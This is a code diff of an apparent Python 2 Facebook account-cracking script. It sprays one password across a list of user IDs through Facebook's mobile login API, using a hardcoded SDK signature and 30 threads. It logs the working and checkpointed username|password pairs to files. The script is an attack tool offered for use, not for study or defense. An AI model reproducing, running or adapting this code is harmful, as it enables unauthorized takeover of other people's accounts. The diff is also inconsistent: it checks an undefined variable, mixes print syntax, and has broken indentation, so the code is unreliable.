@@ -172,7 +172,7 @@ def choice1_menu():
 		print (banner)
 		try:
 			idlist = raw_input("[✓] Enter File Path  : ")
-			password1=raw_input("[1] Input Password  : ")
+			pass1=raw_input("[1] Input Password  : ")
 			print(47*"-")
 			for line in open(idlist,"r").readlines():
 				id.append(line.strip())
@@ -196,7 +196,8 @@ def choice1_menu():
 	
 			
 	def main(arg):
-		global die,check,result,count
+		global cpb,oks
+		user = arg
 		try:
 		    os.mkdir('save')
 		except OSError:
@@ -207,38 +208,39 @@ def choice1_menu():
                                 'access_token': b,
                                 'format': 'JSON',
                                 'sdk_version': '2',
-                                'email': username,
+                                'email': user,
                                 'locale': 'en_US',
-                                'password': password1,
+                                'password': pass1,
                                 'sdk': 'ios',
                                 'generate_session_cookies': '1',
                                 'sig': '3f555f99fb61fcd7aa0c44f58f522ef6',
                         }
                         api = 'https://b-api.facebook.com/method/auth.login'
                         response = requests.get(api, params=params)
-			if 'EAA' in response.text:
-				print(f"\r\033[1;92m  * --> {username}|{password1}                       ",end="")
-                                print()
-                                result += 1
-                                if cek:
-                                       life.append(username+"|"+password1)
-                                else:
-                                       with open('ok.txt','a') as f:
-                                               f.write(username + '|' + password1 + '\n')
-                        elif 'www.facebook.com' in response.json()['error_msg']:
-                              print(f"\r\033[1;93m  * --> {username}|{password1}                    ",end="")
-                              print()
-                              check += 1
-                              if cek:
-                                      chek.append(username+"|"+password1)
-                              else:
-                                      with open('cp.txt','a') as f:
-                                           f.write(username + '|' + password1 + '\n')
-                        else:
-                              die += 1
-                        for i in list('\|/-•'):
-                                       print(f"\r\033[00m [\033[1;91m{i}\033[00m] ok : \033[90m(\033[1;92m{str(result)}\033[90m) \033[00mcp : \033[90m(\033[1;93m{str(oks)}\033[90m) \033[00mdie : \033[90m(\033[1;94m{str(cps)}\033[90m)\033[00m",end="")
-                                       time.sleep(0.2)
+			if "access_token" in q:
+				print '\x1b[1;96m[\x1b[1;96mSuccessful\x1b[1;96m]\x1b[1;96m ' + user + ' \x1b[1;96m|\x1b[1;96m ' + pass1
+				oks.append(user+pass1)
+			else:
+				if "www.facebook.com" in response.json()["error_msg"]:
+					print '\x1b[1;91m[\x1b[1;91mCheckpoint\x1b[1;91m]\x1b[1;91m ' + user + ' \x1b[1;91m|\x1b[1;91m ' + pass1
+					crt = open("save/checkpoint.txt", "a")
+					crt.write(user+"|"+pass1+"\n")
+					crt.close()
+					checkpoint.append(user+pass1)
+		except:
+			pass
+		
+	p = ThreadPool(30)
+	p.map(main, id)
+	print "\033[1;97m----------------------------------------------"
+	hamza('[✓] Process Has Been Completed.')
+	hamza('\033[1;97m[✓] Checkpoint IDS Has Been Saved.')
+	xx = str(len(oks))
+	xxx = str(len(checkpoint))
+	print ("[✓] Total \033[1;32mOK/\033[1;97mCP : \033[1;32m"+str(len(oks))+"/\033[1;97m"+str(len(checkpoint)))
+	print (47*"-")
+	raw_input("\nPress Enter To Back ")
+	choice1()
 	
 	
 if __name__ == '__main__':
